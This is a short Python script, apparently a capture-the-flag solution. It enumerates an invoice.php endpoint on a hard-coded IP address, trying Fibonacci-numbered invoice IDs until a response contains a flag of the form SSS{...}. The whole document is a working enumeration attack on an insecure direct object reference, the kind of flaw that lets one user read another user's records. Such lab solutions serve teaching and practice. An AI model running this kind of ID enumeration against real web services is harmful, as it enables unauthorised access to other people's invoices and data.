import requests
import re

URL = "http://141.85.224.101:30019/invoice.php?invoice="

fibo1 = 1
fibo2 = 1

while True:
    fibo3 = fibo1 + fibo2 
    fibo1 = fibo2
    fibo2 = fibo3

    print(f"Testing for {fibo3}")
    new_url = URL + str(fibo3)
    
    r = requests.get(url = new_url)
    
    match = re.search(r'SSS\{.*?\}', r.text)

    if match:
        flag = match.group(0)
        print(flag)
        break
